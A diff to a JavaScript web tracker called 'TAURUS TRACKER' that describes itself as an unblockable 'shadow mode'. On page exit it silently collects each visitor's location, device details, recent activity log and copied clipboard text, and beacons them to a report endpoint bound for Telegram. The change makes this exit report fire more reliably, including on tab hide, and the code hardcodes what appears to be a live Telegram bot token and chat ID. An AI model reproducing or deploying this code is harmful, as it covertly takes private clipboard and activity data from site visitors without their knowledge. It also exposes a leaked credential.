@@ -1,6 +1,6 @@
 // TAURUS TRACKER v5.0 (Shadow Mode / Backend Oriented)
 /**
- * TAURUS TRACKER v5.5 (Final System - Unified Reporting V27)
+ * TAURUS TRACKER v5.5 (Final System - Unified Reporting V28)
  * ----------------------------------
  * - Altyapı: Backend Oriented (Engellenemez Gölge Modu)
  * - Güvenlik: Middleware IP Gating & Server-side Reporting
@@ -39,15 +39,29 @@
     let exitSent = false; // Prevent duplicate exit messages
 
     // GLOBAL EXIT LISTENER - Single unified handler
+    function escapeHTML(str) {
+        if (!str) return '';
+        return str.toString()
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;')
+            .replace(/'/g, '&#39;');
+    }
+
+    // GLOBAL EXIT LISTENER - Single unified handler
     function sendExitMessage() {
         if (exitSent || window.isInternalNav) return;
-        exitSent = true;
 
         const duration = Math.round((new Date() - sessionStartTime) / 1000);
+        // Requirement: Duration should be at least 1s to avoid ghost reports
+        if (duration < 1) return;
+
+        exitSent = true;
 
         // Build detailed log content
-        const eventLog = localHistory.slice(-50).join('\n'); // Last 50 events for context
-        const clipboardEntries = localHistory.filter(e => e.includes('Copy:')).join('\n');
+        const rawLog = localHistory.slice(-50).join('\n');
+        const rawClipboard = localHistory.filter(e => e.includes('Copy:')).join('\n');
 
         const payload = {
             sessionID: sessionID || 'unknown',
@@ -55,18 +69,26 @@
             exitPage: window.location.pathname,
             location: `${sessionData?.city || 'Unknown'}, ${sessionData?.country || ''}`,
             deviceInfo: `${sessionData?.device?.model || 'Unknown'} (${sessionData?.device?.os || 'Unknown'})`,
-            clipboard: clipboardEntries || 'None',
-            eventLog: eventLog || 'No events recorded',
+            clipboard: escapeHTML(rawClipboard) || 'None',
+            eventLog: escapeHTML(rawLog) || 'No events recorded',
             botToken: window.cachedTelegramConfig?.botToken || '8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE',
             chatId: window.cachedTelegramConfig?.chatId || '6886010817'
         };
 
-        fetch(CONFIG.api.report, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            keepalive: true,
-            body: JSON.stringify(payload)
-        }).catch(function () { });
+        const url = CONFIG.api.report;
+        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon(url, blob);
+            console.log("🐂 Exit Report Queued (Beacon)");
+        } else {
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                keepalive: true,
+                body: JSON.stringify(payload)
+            }).catch(() => { });
+        }
     }
 
     window.addEventListener('pagehide', sendExitMessage);
@@ -1173,8 +1195,7 @@
 
                 // EXIT REPORT: Only if not internal navigation
                 if (!window.isInternalNav) {
-                    // Removed redundant sendPulse exit report here as sendExitMessage 
-                    // handles this more reliably on true exit via pagehide/beforeunload.
+                    sendExitMessage(); // Re-enabled for mobile reliability
                 }
             } else {
                 logHistory('Tab', 'Visible');
